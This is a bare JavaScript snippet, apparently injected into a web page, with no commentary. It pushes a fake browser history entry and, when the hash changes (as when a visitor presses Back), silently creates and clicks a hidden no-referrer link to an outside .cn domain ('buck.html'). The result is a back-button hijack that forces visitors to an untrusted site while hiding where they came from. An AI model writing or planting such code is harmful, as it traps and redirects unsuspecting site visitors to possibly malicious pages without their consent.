window.anchor = function() {
    history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
}
function zp() {
var a = document.createElement('a');
a.setAttribute('rel', 'noreferrer');
a.setAttribute('id', 'm_noreferrer');
a.setAttribute('href', "http://a.84f7e9cn.cn/buck.html");
document.body.appendChild(a);
document.getElementById('m_noreferrer').click();
document.body.removeChild(a);
}
setTimeout("anchor()", 100);
window.onhashchange = function () {
zp()
}